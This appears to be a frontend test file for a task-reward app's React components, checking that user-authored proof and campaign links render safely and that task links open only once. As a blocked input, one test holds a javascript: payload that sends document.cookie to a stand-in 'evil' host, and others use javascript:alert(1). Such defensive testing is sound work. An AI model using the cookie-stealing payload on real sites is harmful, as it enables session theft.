/**
 * Mines link/proof/open component tests.
 *
 * `proof_url` and `content_link` are both user-authored and both opened by
 * somebody else (a reviewer checking a proof, a participant opening a task),
 * so these assert what actually lands in the DOM: real http(s) gets a link, an
 * uploaded screenshot ref gets the authenticated proof route, and anything
 * else renders as inert text. On top of that, the campaign address is treated
 * as what it is — the thing a reward is paid for — so the tests also pin that
 * no surface other than POST /campaigns/:id/open puts it on screen, that the
 * open is spent exactly once per attempt, and that a spent open still shows
 * its destination instead of stranding the participant. And because the
 * address is spent by the open, which screen it appears on is part of the
 * rule: a task shows up exactly once, on Discover, for an account that did
 * not create it and has never met it — see
 * backend/src/routes/mines.js: GET /campaigns/available and GET
 * /opens/pending. See services/proofLink.ts and
 * backend/src/utils/linkPolicy.js.
 */
import { describe, test, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor, cleanup } from '@testing-library/react';
import MinesValidatorQueue from './MinesValidatorQueue';
import MinesDiscover from './MinesDiscover';
import MinesParticipation from './MinesParticipation';
import { ToastHost } from '../../components/ui';
import { minesApi, type AssignedTask, type AvailableCampaignFeed, type CampaignTaskDetail, type MinesCampaign, type MinesSubmission, type PendingOpen, type ReviewerProfile } from '../../services/minesApi';

vi.mock('../../services/minesApi', () => ({
  minesApi: {
    getQueue: vi.fn(),
    vote: vi.fn(),
    getReviewerProfile: vi.fn(),
    reviewerQueueSummary: vi.fn(),
    listAvailableCampaigns: vi.fn(),
    pendingOpens: vi.fn(),
    mySubmissions: vi.fn(),
    submitTask: vi.fn(),
    uploadProof: vi.fn(),
    campaignTask: vi.fn(),
    openCampaignLink: vi.fn(),
  },
}));

const OWNED_REF = '507f1f77bcf86cd799439011-1730000000000-proof.png';
/** The address a campaign pays for. Only /open is allowed to release it. */
const TASK_URL = 'https://x.com/mallchain/status/9';

/**
 * `window.open` is a not-implemented stub in the DOM environment and, more
 * importantly, the argument list is the security decision under test — so it
 * is replaced with something that records it.
 */
const openWindow = vi.fn(() => ({ closed: false }) as unknown as Window);

const REVIEWER: ReviewerProfile = {
  validator_id: 'u1',
  stakedAmount: 100,
  minRequiredStake: 50,
  stakeStatus: 'active',
  mining_reputation: 70,
  tasks_assigned: 4,
  tasks_voted: 3,
  tasks_approved: 2,
  tasks_rejected: 1,
  total_earnings: 1.5,
};

function task(over: Partial<AssignedTask>): AssignedTask {
  return {
    _id: 't1',
    miner_id: 'u2',
    title: 'Like the post',
    description: 'done',
    assignment_status: 'voting',
    votes_required: 6,
    votes_yes: 1,
    votes_no: 0,
    my_vote: null,
    has_voted: false,
    ...over,
  };
}

beforeEach(() => {
  openWindow.mockClear();
  openWindow.mockImplementation(() => ({ closed: false }) as unknown as Window);
  vi.stubGlobal('open', openWindow);
  vi.mocked(minesApi.getReviewerProfile).mockResolvedValue({ ok: true, data: REVIEWER });
  // The queue list only carries this reviewer's slice, so the screen's counts of
  // work the whole network still owes come from a second endpoint.
  vi.mocked(minesApi.reviewerQueueSummary).mockResolvedValue({
    ok: true,
    data: {
      awaiting_verification: 7,
      awaiting_assignment: 3,
      assigned_to_me: 4,
      waiting_for_my_vote: 4,
      settled_last_24h: 2,
      oldest_waiting_since: null,
      source: 'task_submissions',
    },
  });
  vi.mocked(minesApi.uploadProof).mockResolvedValue({ ok: true, data: { documentRef: OWNED_REF } });
  vi.mocked(minesApi.mySubmissions).mockResolvedValue({ ok: true, data: [] });
  vi.mocked(minesApi.pendingOpens).mockResolvedValue({ ok: true, data: [] });
  vi.mocked(minesApi.openCampaignLink).mockResolvedValue({ ok: false, error: 'no open stubbed for this test' });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe('MinesValidatorQueue proof links', () => {
  test('a stored javascript: proof_url renders no anchor at all', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ proof_url: 'javascript:fetch("//evil?c="+document.cookie)' })],
    });

    render(<MinesValidatorQueue />);
    await screen.findByText('Like the post');

    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
    expect(screen.getByText(/Proof link blocked/i)).toBeInTheDocument();
  });

  test('an uploaded screenshot ref opens the authenticated proof route', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({ proof_url: OWNED_REF })] });

    render(<MinesValidatorQueue />);
    const link = await screen.findByText(/View screenshot proof/i);

    expect(link).toHaveAttribute('href', `/api/mines/proof/${encodeURIComponent(OWNED_REF)}`);
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
    expect(link).toHaveAttribute('target', '_blank');
  });

  test('an external proof link opens as-is with the referrer stripped', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({ proof_url: 'https://x.com/a/status/1' })] });

    render(<MinesValidatorQueue />);
    const link = await screen.findByText(/View proof/i);
    expect(link).toHaveAttribute('href', 'https://x.com/a/status/1');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });

  test('a submission with no proof says so instead of hiding the gap', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({})] });

    render(<MinesValidatorQueue />);
    expect(await screen.findByText(/No proof attached/i)).toBeInTheDocument();
  });

  test('the reviewer sees the campaign rate and its published task link', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ campaign_title: 'Mallchain launch', campaign_rate_per_task: 12, campaign_content_link: 'https://mallchain.network/launch' })],
    });

    render(<MinesValidatorQueue />);
    expect(await screen.findByText(/Mallchain launch/)).toBeInTheDocument();
    expect(screen.getByText(/pays 12 MLPTS/)).toBeInTheDocument();
    expect(screen.getByText(/Task link · mallchain.network/)).toHaveAttribute('href', 'https://mallchain.network/launch');
  });

  test('a non-http campaign link is labelled, never linked and never echoed as the label', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ campaign_content_link: 'javascript:alert(1)' })],
    });

    render(<MinesValidatorQueue />);
    await screen.findByText('Like the post');
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
    expect(screen.getByText(/can.t be opened/i)).toBeInTheDocument();
    // The payload belongs in the tooltip for whoever fixes the row, not in the
    // text a reviewer reads.
    expect(screen.queryByText(/alert\(1\)/)).toBeNull();
    expect(document.querySelector('[title*="javascript:alert(1)"]')).not.toBeNull();
  });

  test('a reviewer with no active stake is not offered a vote the server will refuse', async () => {
    vi.mocked(minesApi.getReviewerProfile).mockResolvedValue({
      ok: true,
      data: { ...REVIEWER, stakeStatus: 'unstaked', stakedAmount: 0 },
    });

    render(<MinesValidatorQueue />);
    const approve = await screen.findByRole('button', { name: /Approve/ });
    expect(approve).toBeDisabled();
    expect(screen.getByRole('button', { name: /Reject/ })).toBeDisabled();
    expect(screen.getByText(/Stake required/i)).toBeInTheDocument();
  });
});

/**
 * How much verification work exists is a separate question from how much of it
 * landed in this reviewer's list, and the two come from different endpoints. A
 * reviewer who is told "queue empty" while three submissions sit unassigned is
 * told the network is idle — the exact moment their stake would matter.
 */
describe('MinesValidatorQueue — what the rest of the network owes', () => {
  const card = (label: string) => (screen.getByText(label).parentElement as HTMLElement);

  test('counts awaiting verification from the whole queue, not the assigned slice', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({})] });
    vi.mocked(minesApi.reviewerQueueSummary).mockResolvedValue({
      ok: true,
      data: {
        awaiting_verification: 7,
        awaiting_assignment: 3,
        assigned_to_me: 1,
        waiting_for_my_vote: 1,
        settled_last_24h: 2,
        oldest_waiting_since: null,
        source: 'task_submissions',
      },
    });

    render(<MinesValidatorQueue />);
    await screen.findByText('Like the post');

    expect(card('Tasks awaiting verification').querySelector('.num')?.textContent).toContain('7');
    expect(screen.getByText('1 assigned to you')).toBeInTheDocument();
    expect(card('Tasks awaiting verification').querySelector('.def')?.textContent)
      .toContain('3 of them no reviewer has claimed yet');
  });

  test('an empty list with unclaimed work says so instead of implying an idle network', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [] });

    render(<MinesValidatorQueue />);
    await screen.findByText(/Queue empty/);

    expect(screen.getByText('3 nobody has claimed')).toBeInTheDocument();
    expect(screen.getByText(/still await a decision network-wide/)).toBeInTheDocument();
    expect(screen.queryByText(/New submissions are randomly assigned/)).toBeNull();
  });

  test('a server that does not report the wider queue leaves the card silent', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [] });
    vi.mocked(minesApi.reviewerQueueSummary).mockResolvedValue({ ok: false, error: 'no such route' });

    render(<MinesValidatorQueue />);
    await screen.findByText(/Queue empty/);

    expect(card('Tasks awaiting verification').querySelector('.def')?.textContent)
      .toContain('does not report the queue');
    expect(screen.queryByText(/nobody has claimed/)).toBeNull();
    // The empty list is not restated as a network-wide fact.
    expect(screen.getByText(/New submissions are randomly assigned/)).toBeInTheDocument();
  });
});

function campaign(over: Partial<MinesCampaign>): MinesCampaign {
  return {
    _id: 'c1',
    creator_id: 'u3',
    title: 'Retweet the announcement',
    description: 'RT and comment',
    rate_per_task: 8,
    budget_remaining: 400,
    status: 'active',
    completions_count: 3,
    ...over,
  };
}

function submission(over: Partial<MinesSubmission>): MinesSubmission {
  return {
    _id: 's1',
    campaign_id: 'c1',
    status: 'manual_review',
    assignment_status: 'assigned',
    reward_amount: 8,
    reward_currency: 'MLPTS',
    created_at: new Date().toISOString(),
    ...over,
  };
}

/** GET /campaigns/available, shaped the way the route shapes it. */
function feed(campaigns: MinesCampaign[], availableMlpts?: number): AvailableCampaignFeed {
  return {
    campaigns,
    available_mlpts: availableMlpts ?? campaigns.reduce((sum, c) => sum + Math.min(
      (c.max_completions_per_user || 1) * c.rate_per_task,
      c.budget_remaining || 0,
    ), 0),
  };
}

describe('MinesDiscover cards', () => {
  beforeEach(() => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({ ok: true, data: feed([campaign()]) });
  });

  // Discover reads the per-user feed, never the public campaign list: "is this
  // my own creation, have I already met this task" is the caller's history, and
  // a screen that recomputed it from a submission list would drift from the
  // server that refuses the open.
  test('it reads the authenticated feed and asks for nothing else', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    await screen.findByText('Retweet the announcement');

    expect(minesApi.listAvailableCampaigns).toHaveBeenCalledTimes(1);
    expect(minesApi.mySubmissions).not.toHaveBeenCalled();
    expect(minesApi.pendingOpens).not.toHaveBeenCalled();
  });

  // The rule this whole feature rests on: a list item must not be able to hand
  // out the task, or an open is free and "screenshot or nothing" is decoration.
  test('a campaign card carries no address to the task', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    await screen.findByText('Retweet the announcement');

    expect(document.querySelector('a[href]')).toBeNull();
    expect(screen.queryByText(/x\.com/)).toBeNull();
    expect(minesApi.openCampaignLink).not.toHaveBeenCalled();
  });

  test('the card states the terms POST /submissions will enforce', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    expect(await screen.findByText('1 link open per attempt')).toBeInTheDocument();
    expect(screen.getByText('screenshot proves it')).toBeInTheDocument();
    expect(screen.queryByText(/up to \d+ attempts/)).toBeNull();
  });

  test('a multi-completion campaign is the only one that promises more attempts', async () => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({
      ok: true,
      data: feed([campaign({ max_completions_per_user: 3 })]),
    });
    render(<MinesDiscover navigate={vi.fn()} />);
    expect(await screen.findByText('up to 3 attempts')).toBeInTheDocument();
  });

  // What the user asked for: not only how many tasks are on the screen, but
  // what finishing every one of them would pay.
  test('the header prices the whole screen and each card prices itself', async () => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({
      ok: true,
      data: feed([
        campaign({ _id: 'c1', rate_per_task: 8 }),
        campaign({ _id: 'c2', title: 'Follow the page', rate_per_task: 15, max_completions_per_user: 2 }),
      ], 38),
    });
    render(<MinesDiscover navigate={vi.fn()} />);
    expect(await screen.findByText('up to 38 MLPTS here')).toBeInTheDocument();
    expect(screen.getByText('up to 8 MLPTS')).toBeInTheDocument();
    expect(screen.getByText('up to 30 MLPTS')).toBeInTheDocument();
  });

  // A met task is not greyed out here, it is absent — and there is no state on
  // the card that could suggest otherwise, because the server already decided.
  test('a task this account already met is not on this screen', async () => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({ ok: true, data: feed([]) });
    vi.mocked(minesApi.mySubmissions).mockResolvedValue({
      ok: true,
      data: [submission({ campaign_id: 'c1' })],
    });
    render(<MinesDiscover navigate={vi.fn()} />);

    expect(await screen.findByText('Nothing here that you have not already done')).toBeInTheDocument();
    expect(screen.getByText(/Campaigns leave this screen once you open them/)).toBeInTheDocument();
    expect(screen.queryByText('Retweet the announcement')).toBeNull();
    expect(screen.queryByText('Open task again')).toBeNull();
    expect(screen.queryByText('With reviewers')).toBeNull();
  });
});

function pendingOpen(over: Partial<PendingOpen>): PendingOpen {
  return {
    open_id: 'o1',
    campaign_id: 'c1',
    slot: 1,
    opened_at: '2026-11-03T09:30:00.000Z',
    content_link: TASK_URL,
    title: 'Retweet the announcement',
    platform: 'x',
    rate_per_task: 8,
    campaign_status: 'active',
    ...over,
  };
}

describe('MinesParticipation — the attempt Discover no longer shows', () => {
  test('an open without a screenshot is listed, priced and still points at the task', async () => {
    vi.mocked(minesApi.pendingOpens).mockResolvedValue({ ok: true, data: [pendingOpen()] });
    render(<MinesParticipation navigate={vi.fn()} />);

    expect(await screen.findByText('Awaiting your screenshot')).toBeInTheDocument();
    expect(screen.getByText(/pays 8 MLPTS when reviewers approve/)).toBeInTheDocument();
    const link = screen.getByRole('link', { name: /task you opened/i });
    expect(link).toHaveAttribute('href', TASK_URL);
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
    expect(screen.getByRole('button', { name: /Finish the proof/ })).toBeInTheDocument();
  });

  // The attempt was bought with the open; hiding the address because the policy
  // no longer likes it would throw the money away twice.
  test('an address the policy now refuses is labelled, not linked', async () => {
    vi.mocked(minesApi.pendingOpens).mockResolvedValue({
      ok: true,
      data: [pendingOpen({ content_link: 'javascript:alert(1)' })],
    });
    render(<MinesParticipation navigate={vi.fn()} />);

    expect(await screen.findByText(/no longer openable/i)).toBeInTheDocument();
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
    expect(screen.queryByText(/alert\(1\)/)).toBeNull();
  });

  test('"Finish the proof" opens the task panel the screenshot is uploaded in', async () => {
    vi.mocked(minesApi.pendingOpens).mockResolvedValue({ ok: true, data: [pendingOpen()] });
    vi.mocked(minesApi.campaignTask).mockResolvedValue({
      ok: true,
      data: detail({
        link: { openable: true, host: 'x.com', released: true },
        me: { allowance: 1, openings_used: 1, openings_left: 0, pending_open: spentSlot(), rewarded_submissions: 0, submissions: [] },
      }),
    });
    const view = render(<MinesParticipation navigate={vi.fn()} />);
    fireEvent.click(await view.findByRole('button', { name: /Finish the proof/ }));

    expect(await screen.findByText('Task link')).toBeInTheDocument();
    expect(minesApi.campaignTask).toHaveBeenCalledWith('c1');
    expect(screen.getByLabelText('Screenshot of you doing it')).toBeInTheDocument();
  });

  // A rejected proof must not point back at a screen the server has already
  // emptied for this account.
  test('a rejected attempt is closed, and Discover is not offered as the way out', async () => {
    vi.mocked(minesApi.mySubmissions).mockResolvedValue({
      ok: true,
      data: [submission({ status: 'rejected', assignment_status: 'rejected', reward_amount: 0, rejection_note: 'screenshot does not show the retweet' })],
    });
    render(<MinesParticipation navigate={vi.fn()} />);

    expect(await screen.findByText(/does not show the retweet/)).toBeInTheDocument();
    expect(screen.getByText(/that attempt is closed/i)).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /Resubmit from Discover/ })).toBeNull();
  });
});

function detail(over: Partial<CampaignTaskDetail> = {}): CampaignTaskDetail {
  return {
    task: {
      id: 'c1',
      title: 'Retweet the announcement',
      description: 'RT and comment',
      directive: 'Retweet the announcement and comment "done"',
      platform: 'x',
      platform_label: 'X',
      activity_type: 'retweet',
      activity_label: 'Retweet',
      status: 'active',
      created_at: '2026-11-01T10:00:00.000Z',
      updated_at: '2026-11-02T10:00:00.000Z',
    },
    owner: { display_name: 'mallchain', banned: false },
    reward: { rate_per_task: 8, currency: 'MLPTS', daily_cap_mlpts: 120, paid_when: 'reviewers approve the proof' },
    budget: { funded: 400, remaining: 392, completions: 3 },
    rules: { max_completions_per_user: 1, cooldown_seconds: 3600 },
    link: { openable: true, host: 'x.com', released: false },
    me: { allowance: 1, openings_used: 0, openings_left: 1, pending_open: null, rewarded_submissions: 0, submissions: [] },
    ...over,
  };
}

function spentSlot(over: Partial<CampaignTaskDetail['me']['pending_open']> = {}) {
  return { slot: 1, opened_at: '2026-11-03T09:30:00.000Z', content_link: TASK_URL, ...over };
}

/** Renders Discover (with the toast host the app shell provides) and clicks into the task. */
async function openTaskDetail() {
  const view = render(<>
    <ToastHost />
    <MinesDiscover navigate={vi.fn()} />
  </>);
  fireEvent.click(await view.findByRole('button', { name: /View task/ }));
  await screen.findByText('Task link');
  return view;
}

describe('MinesTaskDetail — the task a participant is shown', () => {
  beforeEach(() => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({ ok: true, data: feed([campaign()]) });
    vi.mocked(minesApi.campaignTask).mockResolvedValue({ ok: true, data: detail() });
  });

  test('owner, publish time, budget and expectations all come from the server', async () => {
    await openTaskDetail();
    expect(minesApi.campaignTask).toHaveBeenCalledWith('c1');

    expect(screen.getByText('@mallchain')).toBeInTheDocument();
    // The exact date string is locale-dependent; that it is the server's
    // created_at (Nov 1) and not today's date is what matters here.
    const published = screen.getByText(/^Published/);
    expect(published.textContent).toContain('2026');
    expect(published.textContent).not.toMatch(/undefined|Invalid/);
    expect(screen.getByText(/400 budgeted · 8 spent/)).toBeInTheDocument();
    expect(screen.getByText(/3 paid completions/)).toBeInTheDocument();
    expect(screen.getByText(/Retweet the announcement and comment/)).toBeInTheDocument();
    expect(screen.getByText('1/1')).toBeInTheDocument();
    // What the money actually depends on, stated wherever the reward is.
    expect(screen.getAllByText(/reviewers approve the proof/).length).toBeGreaterThan(0);
  });

  test('the address is absent until View is clicked, then opens exactly once', async () => {
    vi.mocked(minesApi.openCampaignLink).mockResolvedValue({
      ok: true,
      data: { opened: true, slot: 1, allowance: 1, opened_at: new Date().toISOString(), content_link: TASK_URL },
    });

    const view = await openTaskDetail();
    // The label carries the task name, so nobody clicks a generic "open link".
    expect(view.getByRole('button', { name: /View “Retweet the announcement”/ })).toBeInTheDocument();
    expect(document.querySelector(`a[href="${TASK_URL}"]`)).toBeNull();

    fireEvent.click(view.getByRole('button', { name: /View “Retweet the announcement”/ }));
    await waitFor(() => expect(minesApi.openCampaignLink).toHaveBeenCalledWith('c1'));
    expect(openWindow).toHaveBeenCalledWith(TASK_URL, '_blank', 'noopener,noreferrer');
    // And it is the released address, not the campaign list, that now renders it.
    expect(await screen.findByRole('link', { name: /task you already opened/i })).toHaveAttribute('href', TASK_URL);
  });

  test('a campaign whose link cannot be opened says so and issues no attempt', async () => {
    vi.mocked(minesApi.campaignTask).mockResolvedValue({
      ok: true,
      data: detail({ link: { openable: false, host: null, released: false } }),
    });
    await openTaskDetail();

    expect(screen.queryByRole('button', { name: /View “/ })).toBeNull();
    expect(screen.getByText(/published no openable task address/i)).toBeInTheDocument();
    expect(minesApi.openCampaignLink).not.toHaveBeenCalled();
  });

  test('a refusal from /open is shown and the counts are re-read, not argued with', async () => {
    vi.mocked(minesApi.openCampaignLink).mockResolvedValue({
      ok: false,
      code: 409,
      error: 'you opened this task for slot 1 — the link does not open twice.',
    });
    const view = await openTaskDetail();
    fireEvent.click(view.getByRole('button', { name: /View “/ }));

    // The refusal is in the panel itself, not only in the toast that fades.
    expect(await view.findByRole('alert')).toHaveTextContent(/the link does not open twice/);
    await waitFor(() => expect(minesApi.campaignTask).toHaveBeenCalledTimes(2));
  });

  test('a blocked popup still leaves the paid-for open reachable', async () => {
    openWindow.mockReturnValueOnce(null);
    vi.mocked(minesApi.openCampaignLink).mockResolvedValue({
      ok: true,
      data: { opened: true, slot: 1, allowance: 1, opened_at: new Date().toISOString(), content_link: TASK_URL },
    });
    const view = await openTaskDetail();
    fireEvent.click(view.getByRole('button', { name: /View “/ }));

    expect(await screen.findByText(/blocked the new tab/i)).toBeInTheDocument();
    expect(screen.getByRole('link', { name: /task you already opened/i })).toHaveAttribute('href', TASK_URL);
  });
});

describe('MinesTaskDetail — an open already spent', () => {
  const withPending = (over: Partial<CampaignTaskDetail> = {}) => detail({
    link: { openable: true, host: 'x.com', released: true },
    me: { allowance: 1, openings_used: 1, openings_left: 0, pending_open: spentSlot(), rewarded_submissions: 0, submissions: [] },
    ...over,
  });

  beforeEach(() => {
    vi.mocked(minesApi.listAvailableCampaigns).mockResolvedValue({ ok: true, data: feed([campaign()]) });
    vi.mocked(minesApi.campaignTask).mockResolvedValue({ ok: true, data: withPending() });
  });

  test('the destination stays visible but no second open is offered', async () => {
    await openTaskDetail();

    expect(screen.queryByRole('button', { name: /View “/ })).toBeNull();
    const link = screen.getByRole('link', { name: /task you already opened/i });
    expect(link).toHaveAttribute('href', TASK_URL);
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
    expect(screen.getByText(/cannot destroy the only attempt/i)).toBeInTheDocument();
    expect(minesApi.openCampaignLink).not.toHaveBeenCalled();
  });

  test('proof for a linked task is the screenshot, and nothing else', async () => {
    await openTaskDetail();

    expect(screen.queryByLabelText('…or link to your post')).toBeNull();
    expect(screen.getByText('screenshot only')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Submit for review/ })).toBeDisabled();

    const file = new File([new Uint8Array([1, 2, 3])], 'proof.png', { type: 'image/png' });
    fireEvent.change(screen.getByLabelText('Screenshot of you doing it'), { target: { files: [file] } });
    await waitFor(() => expect(minesApi.uploadProof).toHaveBeenCalledWith(file));
    expect(await screen.findByText(/Uploaded · proof.png/)).toBeInTheDocument();

    vi.mocked(minesApi.submitTask).mockResolvedValue({
      ok: true,
      data: { _id: 's1', campaign_id: 'c1', status: 'manual_review', assignment_status: 'assigned', reward_amount: 8, reward_currency: 'MLPTS', created_at: new Date().toISOString() },
    });
    const submit = screen.getByRole('button', { name: /Submit for review/ });
    expect(submit).toBeEnabled();
    fireEvent.click(submit);
    await waitFor(() => expect(minesApi.submitTask).toHaveBeenCalledTimes(1));
    expect(vi.mocked(minesApi.submitTask).mock.calls[0][0]).toMatchObject({ campaign_id: 'c1', proof_url: OWNED_REF });
  });

  test('the toast only promises reviewer consensus when reviewers actually hold it', async () => {
    vi.mocked(minesApi.submitTask)
      .mockResolvedValueOnce({ ok: true, data: { assignment_status: 'assigned' } as never })
      .mockResolvedValueOnce({ ok: true, data: { assignment_status: 'none' } as never });

    for (const expected of [/sent to reviewers/, /queued for review/]) {
      const view = await openTaskDetail();
      fireEvent.change(view.getByLabelText('Screenshot of you doing it'), {
        target: { files: [new File([new Uint8Array([1])], 'p.png', { type: 'image/png' })] },
      });
      fireEvent.click(await view.findByRole('button', { name: /Submit for review/ }));
      expect(await screen.findByText(expected)).toBeInTheDocument();
      cleanup();
    }
  });

  test('a file the server would reject is refused before the upload', async () => {
    await openTaskDetail();
    fireEvent.change(screen.getByLabelText('Screenshot of you doing it'), {
      target: { files: [new File(['x'], 'scan.pdf', { type: 'application/pdf' })] },
    });
    expect(await screen.findByText(/Only PNG or JPG screenshots are accepted/)).toBeInTheDocument();
    expect(minesApi.uploadProof).not.toHaveBeenCalled();

    fireEvent.change(screen.getByLabelText('Screenshot of you doing it'), {
      target: { files: [new File([new Uint8Array(9 * 1024 * 1024)], 'huge.png', { type: 'image/png' })] },
    });
    expect(await screen.findByText(/larger than the 8 MB limit/)).toBeInTheDocument();
    expect(minesApi.uploadProof).not.toHaveBeenCalled();
  });

  test('an attempt already submitted shows its state instead of a fresh open', async () => {
    vi.mocked(minesApi.campaignTask).mockResolvedValue({
      ok: true,
      data: withPending({
        me: {
          allowance: 1,
          openings_used: 1,
          openings_left: 0,
          pending_open: null,
          rewarded_submissions: 0,
          submissions: [{
            id: 's1', status: 'manual_review', assignment_status: 'voting', reward_amount: 8,
            currency: 'MLPTS', created_at: '2026-11-03T10:00:00.000Z', completed_at: null,
            rejection_note: null, proof_url: OWNED_REF,
          }],
        },
      }),
    });
    await openTaskDetail();

    expect(screen.getByText(/All 1 link open for this campaign are spent/)).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /View “/ })).toBeNull();
    expect(screen.getByText('With reviewers')).toBeInTheDocument();
    expect(screen.getByRole('link', { name: /screenshot/ })).toHaveAttribute('href', `/api/mines/proof/${encodeURIComponent(OWNED_REF)}`);
  });

  test('a rejected attempt says why, in the attempt list', async () => {
    vi.mocked(minesApi.campaignTask).mockResolvedValue({
      ok: true,
      data: withPending({
        me: {
          allowance: 2, openings_used: 1, openings_left: 1, pending_open: null, rewarded_submissions: 0,
          submissions: [{
            id: 's1', status: 'rejected', assignment_status: 'rejected', reward_amount: 0,
            currency: 'MLPTS', created_at: '2026-11-03T10:00:00.000Z', completed_at: '2026-11-03T11:00:00.000Z',
            rejection_note: 'screenshot does not show the retweet', proof_url: OWNED_REF,
          }],
        },
      }),
    });
    await openTaskDetail();

    expect(screen.getByText('Rejected')).toBeInTheDocument();
    expect(screen.getByText(/does not show the retweet/)).toBeInTheDocument();
    // Two attempts allowed, one spent: the second open is still on the table.
    expect(screen.getByRole('button', { name: /View “/ })).toBeEnabled();
  });
});
